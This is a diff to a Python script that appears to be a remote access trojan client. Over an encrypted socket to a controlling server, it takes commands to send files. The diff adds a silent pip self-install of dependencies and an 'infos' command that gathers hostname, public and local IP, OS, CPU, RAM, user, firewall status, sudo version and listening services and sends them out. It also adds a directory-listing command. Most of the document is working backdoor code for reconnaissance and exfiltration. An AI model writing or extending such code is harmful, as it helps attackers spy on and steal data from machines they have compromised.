@@ -1,6 +1,17 @@
 import time
+import importlib
 import subprocess as sp
 import socket
+# list of the modules you have to install manually
+imports = ["requests"]
+try:
+    for i in imports:
+        globals()[i] = importlib.import_module(i)
+except:
+    for i in imports:
+        sp.call(["pip3", "install", i])
+    for i in imports:
+        globals()[i] =  importlib.import_module(i)
 import os
 try:
     from cryptography.fernet import Fernet
@@ -53,4 +64,29 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                         s.send(encrypt(f.read()))
                 except:
                     s.send(b"0")
+            elif option == "infos":
+                # Get System Infos
+                infos = {}
+                infos["hostname"] = sp.getoutput("hostname")
+                try:
+                    infos["remote_ip"] = requests.get("https://api.ipify.org").text
+                except Exception as e:
+                    infos["remote_ip"] = e
+                infos["local_ip"] = socket.gethostbyname(socket.gethostname())
+                infos["operating_system"] = sp.getoutput("uname -a")
+                infos["processor"] = sp.getoutput("cat /proc/cpuinfo | grep 'model name' | head -1")
+                infos["ram"] = sp.getoutput("cat /proc/meminfo | grep 'MemTotal' | awk '{print $2}'")
+                infos["user"] = sp.getoutput("whoami")
+                infos["python_version"] = sp.getoutput("python3 -V")
+                infos["date"] = sp.getoutput("date")
+                infos["firewall"] = sp.getoutput("ufw status")
+                infos["sudo"] = sp.getoutput("sudo -V")
+                infos["services"] = sp.getoutput("ss -tulpn")
+                s.send(encrypt(str(infos)))
+            elif option == "dir":
+                # Get Directory
+                s.send(encrypt(sp.getoutput("ls -l "))) 
+            elif option == "exit":
+                # clear everything
+                exit()
 
